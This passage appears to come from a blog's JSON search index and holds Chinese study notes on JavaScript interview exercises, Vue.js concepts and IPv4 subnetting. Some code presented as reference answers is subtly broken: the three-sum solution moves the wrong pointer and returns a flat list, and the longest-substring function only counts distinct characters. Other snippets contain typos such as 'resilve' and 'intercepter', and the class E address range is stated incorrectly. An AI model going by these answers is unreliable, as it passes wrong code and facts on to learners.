-1) &#123; num_f += '.' + num_s &#125; return num_f &#125; console.log(change(num))//12,345,678.12 写一个判断是否是空对象的函数参考答案： function isEmpty(value) &#123; return ( value === null || value === undefined || (typeof value === 'object' &amp;&amp; Object.keys(value).length === 0) ) &#125; 给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度function countWord(str) &#123; let arr = []; let count = 0; for (let i = 0; i &lt; str.length; i++) &#123; console.log(str.charAt(i)); if (!arr.includes(str.charAt(i))) &#123; arr.push(str[i]); count++; &#125; &#125; console.log(arr); return count; &#125; let str = \"qqdwqcasdffdghjsbjhbm\"; console.log(countWord(str)); 三数之和参考答案： 题目描述 给定一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c &#x3D; 0 ？找出所有满足条件且不重复的三元组。 注意：答案中不可以包含重复的三元组。 //例如, 给定数组 nums = [-1, 0, 1, 2, -1, -4]， //满足要求的三元组集合为： [ [-1, 0, 1], [-1, -1, 2] ] let nums = [-1, 0, 1, 2, -1, -4]; function getNum(nums) &#123; if (nums.length &lt; 3) &#123; return []; &#125; let ans = []; nums.sort((a, b) => a - b); console.log(nums); for (let i = 0; i &lt; nums.length; i++) &#123; if (nums[i] > 0) &#123; break; &#125; let l = i + 1; let r = nums.length - 1; while (l &lt; r) &#123; let sum = nums[i] + nums[l] + nums[r]; if (sum == 0) &#123; ans.push(nums[i], nums[l], nums[r]); l++; r++; &#125; else if (sum > 0) &#123; r--; &#125; else &#123; l++; &#125; &#125; &#125; return ans; &#125; console.log(getNum(nums)); js判断数据类型function getTypeOf(x) &#123; if (typeof (x) != 'object') &#123; return typeof (x) &#125; else &#123; return Object.prototype.toString.apply(x) &#125; &#125; let test = [12, [], function () &#123; &#125;, true, 'kif'] let x for (x in test) ( console.log(getTypeOf(test[x])) ) arr.flat(Infinity)flat作为ES6的新特性，只要调用该方法便可以简单快速实现数组的扁平化，使用起来确实很容易上手(可以说是0门槛)，但是只会这个方法是没有办法得到面试官的青睐的！ const arr = [1, [2, [3, [4, [5]]]]];``// 1. flat自动展开``let arr1 = arr.flat(Infinity);``console.log(arr1); ``// [ 1, 2, 3, 4, 5 ]"},{"title":"vue部分知识点","path":"/post/4e3b.html","text":"vue是什么用于构建用户界面的渐进式开源JS框架，是创建单页应用的Web框架 核心特征： 数据驱动mvvm 组件化 指令系统 SPA与MPASPA单页应用： 动态重写当前页面数据用以用户交互 MPA：多页应用，每一个页面都是主页面 SPA首加载慢：原因：网络延时，资源体积太大 解决办法：减小入口文件体积，Gzip压缩，静态资源缓存 v-if和v-show作用：都是控制元素显示与否 不同点： 作用机理，v-if控制的是元素是否渲染，而v-show控制css的display属性，故频繁改变现隐状态使用v-show可以减少消耗 Vue实例挂载过程 调用_init方法(其中定义set、get、delete、destory方法；定义on,off,emit事件；定义update,forceupdate,destoryed生命周期) 调用$mount挂载实例对象 挂载是执行mountcomponent方法 调用render函数创建虚拟dom 调用updatemount将虚拟DOM挂载到真实DOM，并渲染到页面中 v-if和v-for不建议同时作用于同一元素，v-for优先级高于v-if，故每次都会现循环渲染，在逻辑判断 路由懒加载整个网页默认是刚打开就去加载所有页面，路由懒加载就是只加载你当前点击的那个模块。 按需去加载路由对应的资源，提高首屏加载速度（tip:首页不用设置懒加载，而且一个页面加载过后再次访问不会重复加载）。 实现原理：将路由相关的组件，不再直接导入了，而是改写成异步组件的写法，只有当函数被调用的时候，才去加载对应的组件内容。 未启用： import Vue from 'vue' import Router from 'vue-router' import HelloWorld from '@/components/HelloWorld' Vue.use(Router) export default new Router(&#123; routes: [ &#123; path: '/', name: 'HelloWorld', component:HelloWorld &#125; ] &#125;) ES 提出的import方法启用： import Vue from 'vue' import Router from 'vue-router' Vue.use(Router) const HelloWorld =()=>import(\"@/components/HelloWorld\") export default new Router(&#123; routes: [ &#123; path: '/', name: 'HelloWorld', component:HelloWorld &#125; ] &#125;) 简化： import Vue from 'vue' import Router from 'vue-router' Vue.use(Router) //const HelloWorld =()=>inport(\"@/components/HelloWorld\") export default new Router(&#123; routes: [ &#123; path: '/', name: 'HelloWorld', component:()=>import(\"@/components/HelloWorld\") &#125; ] &#125;) 为什么data是函数不是对象 根实例对象data可以是对象也可以是函数（根实例是单例），不会产生数据污染情况 组件实例对象data必须为函数，目的是为了防止多个组件实例对象之间共用一个data，产生数据污染。采用函数的形式，initData时会将其作为工厂函数都会返回全新data对象 vue2和vue3双向绑定vue2：通过 object.defineProperty 实现，这种方法不会监听到属性变化和数组变化，会造成 问题：动态给vue的data添加一个新的属性时页面不会刷新Object.defineProperty原理： let obj=&#123;&#125; Object.defineProperty(obk,'foo',&#123; get()&#123; return val &#125;, set(newVal)&#123; if(newVal!=val)&#123; val = newVal &#125; &#125; &#125;) ​ 所以set只能对初始化是已经存在的属性进行赋值，无法拦截到新增属性； 解决方法 Vue.set() object.assign() forceUpdate()强制刷新 vue3针对vue2中的问题，Vue3 使用了ES6新增的Proxy代理来拦截变化，可以监听到属性以及数组变化 Vue中组件和插件组件定义：每一个.vue文件都可以视作一个组件，方便调试， 利于维护等； 编写模式：每一个vue文件模板： &lt;template&gt;&lt;&#x2F;template&gt; &lt;script&gt; exprot default&#123; &#125; &lt;&#x2F;script&gt; &lt;style&gt;&lt;&#x2F;style&gt; 我们还可以通过template属性来编写一个组件，如果组件内容多，我们可以在外部定义template组件内容，如果组件内容并不多，我们可直接写在template属性上 &lt;template id=\"testComponent\"> // 组件显示的内容 &lt;div>component!&lt;/div> &lt;/template> Vue.component('componentA',&#123; template: '#testComponent' template: `&lt;div>component&lt;/div>` // 组件内容少可以通过这种形式 &#125;) 注册形式：Vue组件之间的通信方式 父子关系的组件数据传递选择 props 与 $emit进行传递，也可选择ref 兄弟关系的组件数据传递可选择$bus，其次可以选择$parent进行传递 祖先与后代组件数据传递可选择attrs与listeners或者 Provide与 Inject 复杂关系的组件数据传递可以通过vuex存放共享的变量 vue的mixinmixin（混入），提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。 本质其实就是一个js对象，它可以包含我们组件中任意功能选项，如data、components、methods、created、computed等等 我们只要将共用的功能以对象的方式传入 mixins选项中，当组件使用 mixins对象时所有mixins对象的选项都将被混入该组件本身的选项中来 在Vue中我们可以局部混入跟全局混入 vue中key的原理 当我们在使用v-for时，需要给单元加上key 用+new Date()生成的时间戳作为key，手动强制触发重新渲染 keep-alive某些情况下不需要对组件重新加载，使用 kepp-alive使得组件可以缓存起来 使用方法： 路由中设置是否缓存 &#123; path:'list', name:'itemList', component:()=>import('@/conponents/list'), meta:&#123; keepalive:true, title:'标题页' &#125; &#125; &lt;div&gt; &lt;keep-alive&gt; &lt;router-view v-if&#x3D;&#39;$route.meta.keepalive&#39;&gt;&lt;&#x2F;router-view&gt; &lt;&#x2F;keep-alive&gt; &lt;&#x2F;div&gt; Vue常用的修饰符vue中修饰符分为以下五种： 表单修饰符 事件修饰符 鼠标按键修饰符 键值修饰符 v-bind修饰符 表单修饰符lazy在我们填完信息，光标离开标签的时候，才会将值赋予给value，也就是在change事件之后再进行信息同步 &lt;input type&#x3D;&#39;text&#39; v-model.lazy&#x3D;&quot;message&quot;&gt; trim自动过滤用户输入的首空格字符，而中间的空格不会过滤 &lt;input type&#x3D;&#39;text&#39; v-model.trim&#x3D;&quot;value&quot;&gt; number自动将输入的值转为number &lt;input type&#x3D;&quot;number&quot; v-model.number&#x3D;&quot;value&quot;&gt; 事件修饰符stop阻止冒泡事件，相当与调用event.stopPropagation() &lt;button @click.stop&#x3D;&quot;on&quot;&gt; 点击 &lt;&#x2F;button&gt; prevent阻止默认事件 &lt;button @click.prevent&#x3D;&quot;on&quot;&gt; dian &lt;&#x2F;button&gt; once只触发一次 &lt;button @click.once&#x3D;&quot;shout(1)&quot;&gt;ok&lt;&#x2F;button&gt; 鼠标按钮修饰符鼠标按钮修饰符针对的就是左键、右键、中键点击，有如下： left 左键点击 right 右键点击 middle 中键点击 &lt;button @click.left&#x3D;&quot;shout(1)&quot;&gt;ok&lt;&#x2F;button&gt; &lt;button @click.right&#x3D;&quot;shout(1)&quot;&gt;ok&lt;&#x2F;button&gt; &lt;button @click.middle&#x3D;&quot;shout(1)&quot;&gt;ok&lt;&#x2F;button&gt; v-bind修饰符async能对props进行一个双向绑定 &#x2F;&#x2F;父组件 &lt;comp :myMessage.sync&#x3D;&quot;bar&quot;&gt;&lt;&#x2F;comp&gt; &#x2F;&#x2F;子组件 this.$emit(&#39;update:myMessage&#39;,params); 自定义指令实现自定义指令有全局注册与局部注册 全局注册Vue.directive第一个参数是指令的名字（不需要写上v-前缀），第二个参数可以是对象数据，也可以是一个指令函数 局部注册局部注册通过在组件options选项中设置directive属性 使用自定义指令可以满足我们日常一些场景，这里给出几个自定义指令的案例： 防抖 图片懒加载 一键 Copy的功能 diff算法作用：同级树节点的高效比较算法 特点：同级比较，循环从两边向中间 新旧VNode节点如下图所示： 第一次循环后，发现旧节点D与新节点D相同，直接复用旧节点D作为diff后的第一个真实节点，同时旧节点endIndex移动到C，新节点的 startIndex 移动到了 C 第二次循环后，同样是旧节点的末尾和新节点的开头(都是 C)相同，同理，diff 后创建了 C 的真实节点插入到第一次创建的 B 节点后面。同时旧节点的 endIndex 移动到了 B，新节点的 startIndex 移动到了 E 第三次循环中，发现E没有找到，这时候只能直接创建新的真实节点 E，插入到第二次创建的 C 节点之后。同时新节点的 startIndex 移动到了 A。旧节点的 startIndex 和 endIndex 都保持不动 第四次循环中，发现了新旧节点的开头(都是 A)相同，于是 diff 后创建了 A 的真实节点，插入到前一次创建的 E 节点后面。同时旧节点的 startIndex 移动到了 B，新节点的startIndex 移动到了 B 第五次循环中，情形同第四次循环一样，因此 diff 后创建了 B 真实节点 插入到前一次创建的 A 节点后面。同时旧节点的 startIndex移动到了 C，新节点的 startIndex 移动到了 F 新节点的 startIndex 已经大于 endIndex 了，需要创建 newStartIdx 和 newEndIdx 之间的所有节点，也就是节点F，直接创建 F 节点对应的真实节点放到 B 节点后面 Axios定义：是轻量级的Http库，基于XMLHttpRequest,支持promise 封装项目中对于请求的header，超时时间，不同环境的不同api地址等问题，统一管理便于代码维护 设置请求前缀if(a)&#123; axios.defaults.baseURL='a' &#125;else&#123; axios.defaults.baseURL='b' &#125; 封装请求//get export function httpGet(&#123; url, params = &#123;&#125; &#125;) &#123; return new Promise((resolve, reject) => &#123; axios.get(url, &#123; params &#125;).then(res => resolve(res)).catch(err => reject(err)) &#125;) &#125; //post export function httpPost(&#123; url, params = &#123;&#125;, data = &#123;&#125; &#125;) &#123; return new Promise((resolve, reject) => &#123; axios(&#123; url, method: 'POST', data: data, params &#125;).then((res) => &#123; resilve(res) &#125;).catch((err) => &#123; reject(err) &#125;) &#125;) &#125; 拦截器interceptors请求拦截器如有token时header加入token axios.intercepter.request.use(config => &#123; let token = localStorage.getItem('token') if (token) &#123; config.headers.Authorization = token &#125; return config &#125;) 响应拦截器axios.intercepter.response.use(response=>&#123; if(response.status==400)&#123; return Promise.reject(response) &#125;else&#123; // ... &#125; &#125;) SSR解决了什么问题？有做过SSR吗？你是怎么做的SSR主要解决了以下两种问题： seo：搜索引擎优先爬取页面HTML结构，使用ssr时，服务端已经生成了和业务想关联的HTML，有利于seo 首屏呈现渲染：用户无需等待页面所有js加载完成就可以看到页面视图（压力来到了服务器，所以需要权衡哪些用服务端渲染，哪些交给客户端） vue要做权限管理该怎么做？如果控制到按钮级别的权限怎么做？接口权限后端JWT，登录完拿到token，将token存起来，通过axios请求拦截器进行拦截，每次请求的时候头部携带token 路由权限控制Vue项目中你是如何解决跨域跨域本质是浏览器基于同源策略的一种安全手段 同源策略： 协议 主机 端口 解决跨域的方法有很多，下面列举了三种： JSONP CORS PROXY cors后端方案 django模块：django-cors-headers pip install django-cors-headers Proxy webpack可以设置 服务端设置 nginx设置反向代理 特性以及部分原理自定义指令（directive）除了核心功能默认内置的指令 (v-model 和 v-show)，Vue 也允许注册自定义指令。有时候我们想对dom进行操作的时候，就可以使用自定义指令，比如设置标题样式并且让标题一直固定在页面上方，可以使用全局注册或者局部注册。然后你可以在模板中任何元素上使用新的 v-title property。 &#x2F;&#x2F;全局注册 &lt;div id&#x3D;&quot;app&quot;&gt; &lt;div v-title&gt;hello world&lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;script&gt; Vue.directive(&#39;title&#39;, &#123; inserted: function (el) &#123; console.log(el) el.style.position &#x3D; &#39;fixed&#39; el.style.top &#x3D; &#39;50px&#39; el.style.left &#x3D; &#39;48%&#39; el.style.color &#x3D; &#39;#409EFF&#39; &#125; &#125;) new Vue(&#123; el: &#39;#app&#39;, data: &#123; message: &#39;hello!&#39; &#125; &#125;) &lt;&#x2F;script&gt; &lt;style&gt; #app&#123; height: 1000px &#125; &lt;&#x2F;style&gt; &#x2F;&#x2F;局部注册 new Vue(&#123; el: &#39;#app&#39;, directives: &#123; title: &#123; inserted: function (el) &#123; console.log(el) el.style.position &#x3D; &#39;fixed&#39; el.style.top &#x3D; &#39;50px&#39; el.style.left &#x3D; &#39;48%&#39; el.style.color &#x3D; &#39;#409EFF&#39; &#125; &#125; &#125; &#125;) irective钩子函数参数指令钩子函数会被传入以下参数： el：指令所绑定的元素，可以用来直接操作 DOM。 binding：一个对象，包含以下 property： name：指令名，不包括 v- 前缀。 value：指令的绑定值，例如：v-my-directive&#x3D;”1 + 1” 中，绑定值为 2。 oldValue：指令绑定的前一个值，仅在 update 和 componentUpdated 钩子中可用。无论值是否改变都可用。 expression：字符串形式的指令表达式。例如 v-my-directive&#x3D;”1 + 1” 中，表达式为 “1 + 1”。 arg：传给指令的参数，可选。例如 v-my-directive:foo 中，参数为 “foo”。 modifiers：一个包含修饰符的对象。例如：v-my-directive.foo.bar 中，修饰符对象为 { foo: true, bar: true }。 vnode：Vue 编译生成的虚拟节点。移步 VNode API 来了解更多详情。 oldVnode：上一个虚拟节点，仅在 update 和 componentUpdated 钩子中可用。 我们打印下函数传入的参数，其实简单来说就是el就是绑定dom元素，binging指令：后所携带的具体内容，VNode就当还未生成的节点好了。 &lt;div v-title:arr&#x3D;&quot;message&quot;&gt;hello world&lt;&#x2F;div&gt; Vue.directive(&#39;title&#39;, &#123; inserted: function (el, binding, vnode) &#123; console.log(el, binding, vnode) el.style.position &#x3D; &#39;fixed&#39; el.style.top &#x3D; &#39;50px&#39; el.style.left &#x3D; &#39;48%&#39; el.style.color &#x3D; &#39;#409EFF&#39; &#125; &#125;) 复制代码 钩子函数一个指令定义对象可以提供如下几个钩子函数 (均为可选)： bind：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。 inserted：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。 update：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新 (详细的钩子函数参数见下)。 componentUpdated：指令所在组件的 VNode 及其子 VNode 全部更新后调用 unbind：只调用一次，指令与元素解绑时调用。 我们可以测试下钩子函数的调用时机： &lt;div id&#x3D;&quot;app&quot;&gt; &lt;div id&#x3D;&quot;txt&quot; v-title:data&#x3D;&quot;sum&quot;&gt;value: &#123;&#123;sum&#125;&#125;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;script&gt; new Vue(&#123; el: &#39;#app&#39;, data: &#123; sum: 0 &#125;, directives: &#123; title: &#123; bind: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;a&#39;) &#125;,&#x2F;&#x2F; 第一次绑定元素时调用 inserted: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;b&#39;) &#125;,&#x2F;&#x2F; 当被绑定的元素插入到 DOM 中时…… update: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;c&#39;) &#125;,&#x2F;&#x2F; 所在组件VNode发生更新时调用 componentUpdated: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;d&#39;) &#125;, &#x2F;&#x2F; 指令所在组件的 VNode 及其子 VNode 全部更新后调用 unbind: (el, bind) &#x3D;&gt; &#123; console.log(bind.value, &#39;e&#39;) &#125; &#x2F;&#x2F; 只调用一次，指令与元素解绑时调用 &#125; &#125;, mounted() &#123; console.log(this.sum, &#39;???&#39;) let timer &#x3D; setInterval(() &#x3D;&gt; &#123; this.sum++ &#125;, 200) setTimeout(() &#x3D;&gt; &#123; clearInterval(timer) &#125;, 3000) &#125; &#125;) &lt;&#x2F;script&gt; 指令大致原理在页面渲染的过程中，分别有创建(create)、激活(avtivate)、更新(update)、移除(remove)、销毁(destroy)，在这些过程中，框架在每个时段都会调用相应的钩子函数，这些hooks中一部分的函数就包含了我们的指令。源码部分我了解的不多，给大家推荐一篇vue指令原理相关博文www.cnblogs.com/gerry2019/p… 混入官方是这样定义的：混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。其实就是vue实例的一个复用。实用场景：公共组件或者功能，例如获取用户白名单、菜单返回、公共基础table。 值得注意的点： 当组件和混入对象含有同名选项时，这些选项将以恰当的方式混合。比如，数据对象在内部会进行浅合并 (一层属性深度)，在和组件的数据发生冲突时以组件数据优先。 同名钩子函数将混合为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用。 值为对象的选项，例如 methods, components 和 directives，将被混合为同一个对象。两个对象键名冲突时，取组件对象的键值对。 var mixin &#x3D; &#123; data: function () &#123; return &#123; message: &#39;hello&#39;, foo: &#39;abc&#39; &#125; &#125; &#125; new Vue(&#123; mixins: [mixin], data: function () &#123; return &#123; message: &#39;goodbye&#39;, bar: &#39;def&#39; &#125; &#125;, created: function () &#123; console.log(this.$data) &#x2F;&#x2F; &#x3D;&gt; &#123; message: &quot;goodbye&quot;, foo: &quot;abc&quot;, bar: &quot;def&quot; &#125; &#125; &#125;) 复制代码 高阶组件一个函数接受一个组件为参数，返回一个包装后的组件。其实在vue中，组件可以当做一个函数，那从本质上来说，高阶组件就是高阶函数（JavaScript的函数其实都指向某个变量。既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数） 高阶函数举例一个最简单的高阶函数计算次方 function pow(x, y, f)&#123; return f(x, y); &#125; pow(3, 3, Math.pow) 复制代码 在es6中也有很多高阶函数，如map、reduce、filter。 高阶组件的例子&lt;div id&#x3D;&quot;app&quot;&gt; &lt;hoc&gt;&lt;&#x2F;hoc&gt; &lt;&#x2F;div&gt; &lt;script&gt; const view &#x3D; &#123; template: &#96;&lt;span&gt; &lt;span&gt;test hoc ...&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&#96;, props: [&quot;result&quot;, &quot;loading&quot;], &#125;; const test &#x3D; (wrapped, txt &#x3D; &#39;hello&#39;) &#x3D;&gt; &#123; return &#123; render(h) &#123; const args &#x3D; &#123; props: &#123; result: this.result, loading: this.loading, &#125;, &#125;; const wrapper &#x3D; h(&quot;div&quot;, [ h(wrapped, args), &#39;loading&#39; ]); return wrapper &#125; &#125; &#125; const hoc &#x3D; test(view, &#39;hui&#39;) console.log(hoc); new Vue(&#123; el: &#39;#app&#39;, components: &#123; hoc &#125;, data: &#123; sum: 0 &#125; &#125;) &lt;&#x2F;script&gt; 复制代码 值得注意的点 高阶组件(HOC)应该是无副作用的纯函数，且不应该修改原组件,就是组件是一个新的组件，不会对原组件做修改。 高阶组件(HOC)不关心你传递的数据(props)是什么，并且被包装组件(WrappedComponent)不关心数据来源 高阶组件(HOC)接收到的 props 应该透传给被包装组件(WrappedComponent) 在高阶组件中渲染函数向子组件中传递作用域插槽时候要注意上下文 动态组件 异步组件 递归组件动态组件可以在同组件之间进行动态切换， 动态切换可以通过 Vue 的 元素加一个特殊的 is attribute 来实现： &lt;!-- 组件会在 &#96;currentTabComponent&#96; 改变时改变 --&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Dynamic Components Example&lt;&#x2F;title&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue&quot;&gt;&lt;&#x2F;script&gt; &lt;style&gt; .tab-button &#123; padding: 6px 10px; border-top-left-radius: 3px; border-top-right-radius: 3px; border: 1px solid #ccc; cursor: pointer; background: #f0f0f0; margin-bottom: -1px; margin-right: -1px; &#125; .tab-button:hover &#123; background: #e0e0e0; &#125; .tab-button.active &#123; background: #e0e0e0; &#125; .tab &#123; border: 1px solid #ccc; padding: 10px; &#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div id&#x3D;&quot;dynamic-component-demo&quot; class&#x3D;&quot;demo&quot;&gt; &lt;button v-for&#x3D;&quot;tab in tabs&quot; v-bind:key&#x3D;&quot;tab&quot; v-bind:class&#x3D;&quot;[&#39;tab-button&#39;, &#123; active: currentTab &#x3D;&#x3D;&#x3D; tab &#125;]&quot; v-on:click&#x3D;&quot;currentTab &#x3D; tab&quot; &gt; &#123;&#123; tab &#125;&#125; &lt;&#x2F;button&gt; &lt;component v-bind:is&#x3D;&quot;currentTabComponent&quot; class&#x3D;&quot;tab&quot;&gt;&lt;&#x2F;component&gt; &lt;&#x2F;div&gt; &lt;script&gt; Vue.component(&quot;tab-home&quot;, &#123; template: &quot;&lt;div&gt;Home component&lt;&#x2F;div&gt;&quot; &#125;); Vue.component(&quot;tab-posts&quot;, &#123; template: &quot;&lt;div&gt;Posts component&lt;&#x2F;div&gt;&quot; &#125;); Vue.component(&quot;tab-archive&quot;, &#123; template: &quot;&lt;div&gt;Archive component&lt;&#x2F;div&gt;&quot; &#125;); new Vue(&#123; el: &quot;#dynamic-component-demo&quot;, data: &#123; currentTab: &quot;Home&quot;, tabs: [&quot;Home&quot;, &quot;Posts&quot;, &quot;Archive&quot;] &#125;, computed: &#123; currentTabComponent: function() &#123; return &quot;tab-&quot; + this.currentTab.toLowerCase(); &#125; &#125; &#125;); &lt;&#x2F;script&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; 复制代码 异步组件在大型应用中，我们可能需要将应用分割成小一些的代码块，并且只在需要的时候才从服务器加载一个模块。为了简化，Vue 允许你以一个工厂函数的方式定义你的组件，这个工厂函数会异步解析你的组件定义。Vue 只有在这个组件需要被渲染的时候才会触发该工厂函数，且会把结果缓存起来供未来重渲染。 Vue.component(&#39;async-example&#39;, function (resolve, reject) &#123; setTimeout(function () &#123; &#x2F;&#x2F; 向 &#96;resolve&#96; 回调传递组件定义 resolve(&#123; template: &#39;&lt;div&gt;I am async!&lt;&#x2F;div&gt;&#39; &#125;) &#125;, 1000) &#125;) 复制代码 在vue-cli中在使用异步组件 const first &#x3D;()&#x3D;&gt;import(&#x2F;* webpackChunkName: &quot;group-foo&quot; *&#x2F; &quot;..&#x2F;components&#x2F;first.vue&quot;); 复制代码 vue中部分钩子函数(@hook)Vue 实例同时在其事件接口中提供了其它的方法。我们可以： 通过 $on(eventName, eventHandler) 侦听一个事件 通过 $once(eventName, eventHandler) 一次性侦听一个事件 通过 $off(eventName, eventHandler) 停止侦听一个事件 你通常不会用到这些，但是当你需要在一个组件实例上手动侦听事件时，它们是派得上用场的。它们也可以用于代码组织工具。例如，你可能经常看到这种集成一个第三方库的模式。官网提供一个案例：在不使用beforeDestroy钩子清picker &#x2F;&#x2F;案例一 mounted: function () &#123; var picker &#x3D; new Pikaday(&#123; field: this.$refs.input, format: &#39;YYYY-MM-DD&#39; &#125;) this.$once(&#39;hook:beforeDestroy&#39;, function () &#123; picker.destroy() &#125;) &#125; &#x2F;&#x2F;案例二 &#x2F;&#x2F;在父组件在子组件渲染阶段做一些操作 &lt;child @hook:mounted&#x3D;&quot;handle&quot; @hook:beforeUpdated&#x3D;&quot;xxx&quot; @hook:updated&#x3D;&quot;xxx&quot; &#x2F;&gt; method () &#123; handle() &#123; &#x2F;&#x2F; do something... &#125; &#125;, 复制代码 在vue生命周期中周期都有对应的钩子函数 插件插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制——一般有下面几种： 添加全局方法或者 property。如：vue-custom-element 添加全局资源：指令&#x2F;过滤器&#x2F;过渡等。如 vue-touch 通过全局混入来添加一些组件选项。如 vue-router 添加 Vue 实例方法，通过把它们添加到 Vue.prototype 上实现。 一个库，提供自己的 API，同时提供上面提到的一个或多个功能。如 vue-router 自定义插件 MyPlugin.install &#x3D; function (Vue, options) &#123; &#x2F;&#x2F; 1. 添加全局方法或 property Vue.myGlobalMethod &#x3D; function () &#123; &#x2F;&#x2F; 逻辑... &#125; &#x2F;&#x2F; 2. 添加全局资源 Vue.directive(&#39;my-directive&#39;, &#123; bind (el, binding, vnode, oldVnode) &#123; &#x2F;&#x2F; 逻辑... &#125; ... &#125;) &#x2F;&#x2F; 3. 注入组件选项 Vue.mixin(&#123; created: function () &#123; &#x2F;&#x2F; 逻辑... &#125; ... &#125;) &#x2F;&#x2F; 4. 添加实例方法 Vue.prototype.$myMethod &#x3D; function (methodOptions) &#123; &#x2F;&#x2F; 逻辑... &#125; &#125; 复制代码 部分参考：作者：仅九链接：https://juejin.cn/post/6985035199432097823"},{"title":"标准分类的IP地址","path":"/post/afd3.html","text":"一、标准分类的IP地址 每台计算机都要有IP地址，有了IP地址才能互相通信，计算机之间只能互相认识IP地址。IP地址可以理解为计算机的×××号。 （一）二进制和十进制数转换(★记住) 11111111→128＋64＋32＋16＋8＋4＋2＋1＝240＋15＝255 举例： 10100000→128＋32＝160 反过来160＝128＋32→10100000 10011000→128＋16＋8＝152 01000100→64＋4＝68 （二）IP地址的表示 IPv4地址采用32位的二进制数表示，表示形式为： ... (其中*表示1个二进制位，共4组，每组8位二进制数) 比如：11000000.10101000.00000101.00010111 写成十进制数就是：X.X.X.X（其中X表示0—255之间的一个十进制数），比如： 192.168.5.23、218.85.157.99、218.85.152.99 是正确的IP地址。 156.56.45、256.45.345.34、56.0.0.1.7 是错误的IP地址。 （三）IP地址的分类(记住) IP地址分为A类、B类、C类、D类、E类，规定如下： A类：网络位8位，主机位24位，网络前导位为0，即： 0*******...******** 即1.0.0.0—127.255.255.255 网络位00000000不可用，网络位01111111(127)表示回送地址，指本地机。 B类：网络位16位，主机位16位，网络前导位为10，即： 10******...******** 即128.0.0.0—191.255.255.255 C类：网络位24位，主机位8位，前导位为110，即： 110*****...******** 即192.0.0.0—223.255.255.255 D类：组播地址，前导位为1110，即： 1110****...******** 即224.0.0.0—239.255.255.255 E类：保留地址，前导位为11110，即： 11110***...******** 即240.0.0.0—247.255.255.255 其中A类、B类、C类IP地址可供普通用户使用。 （四）私有IP地址(记住) IP地址分为公有IP地址和私有IP地址(也称外部IP地址和内部IP地址，或称全局IP地址和专用IP地址)，在互联网中，公有IP地址可以被外网访问，私有IP地址仅用于内部网络使用，不能被外网访问。私有IP地址如下： A类：10.0.0.0—10.255.255.255 B类：172.16.0.0—172.31.255.255 C类：192.168.0.0—192.168.255.255 （五）IP地址的相关规定(记住) 1.网络地址、主机地址、广播地址 IP地址由“网络位+主机位”组成。 网络地址：主机位全0 主机地址：网络位全0 直接广播地址：主机位全1 举例：IP地址 201.161.20.18 的网络地址是201.161.20.0，主机地址是0.0.0.18，直接广播地址为201.161.20.255。 2.可用的IP地址 主机位不可全0或全1（全0是网络地址，全1是广播地址） 在一个网段内，最小的可用IP地址是“网络地址+1”，最大的可用IP地址是“广播地址-1”。 举例：192.168.1.0～192.168.1.255网段中，可用的IP地址是：192.168.1.1～192.168.1.254 受限广播地址(或称为“有限广播地址”) 32位全1的IP地址(255.255.255.255)表示受限广播地址。 受限广播地址和直接广播地址的区别，举例：255.255.255.255和192.168.5.255。 交换机转发广播，路由器不转发广播。 二、子网掩码 子网掩码用来区别网络位和主机位，用1表示网络位，用0表示主机位。比如： A类IP地址的掩码：11111111.00000000.00000000.00000000 写成十进制 255.0.0.0 也可以用&#x2F;8来表示，表示前8位是网络位，比如：10.3.3.3&#x2F;8 B类IP地址的掩码：11111111.11111111.00000000.00000000 写成十进制 255.255.0.0 也可以用&#x2F;16来表示，表示前16位是网络位，比如：172.16.7.6&#x2F;16 C类IP地址的掩码：11111111.11111111.11111111.00000000 写成十进制 255.255.255.0 也可以用&#x2F;24来表示，表示前24位是网络位，比如：192.168.5.8&#x2F;24 子网掩码为255.255.255.255表示本网段只有1个IP地址，举例：电信运营商动态分配给用户的IP地址110.80.191.243和子网掩码255.255.255.255。 三、划分子网的三级网络结构 将一个大的网络划分成几个较小的子网，变成“网络位+子网位+主机位”的三级结构。 （一）子网掩码的计算(★记住) 10000000→128 (借1位) 11000000→128＋64＝192 (借2位) 11100000→128＋64＋32＝224 (借3位) 11110000→128＋64＋32＋16＝240 (借4位) 11111000→128＋64＋32＋16＋8＝248 (借5位) 11111100→128＋64＋32＋16＋8＋4＝252 (借6位) 11111110→128＋64＋32＋16＋8＋4＋2＝254 (借7位) 11111111→128＋64＋32＋16＋8＋4＋2＋1＝255 (借8位) （二）子网划分计算 向主机位借1位可以划分成2个子网，借2位划分成4个子网，借3位划分成8个子网，如下： 28＝256，27＝128，26＝64，25＝32，24＝16，23＝8，22＝4，21＝2 （三）举例 举例1：172.17.0.3&#x2F;19子网掩码是多少 (借3位) 子网掩码11111111.11111111.11100000.00000000 即255.255.224.0 举例2：192.168.6.7&#x2F;26子网掩码是多少 (借2位) 子网掩码11111111.11111111.11111111.11000000 即255.255.255.192 举例3：IP地址172.16.37.95，子网掩码为255.255.224.0，写出网络地址、主机地址和广播地址。 解答：224表示借3位，172.16.37.95→172.16.00100101.95； 网络地址：172.16.00100000.0→172.16.32.0 (主机位全0) 主机地址：0.0.00000101.95→0.0.5.95 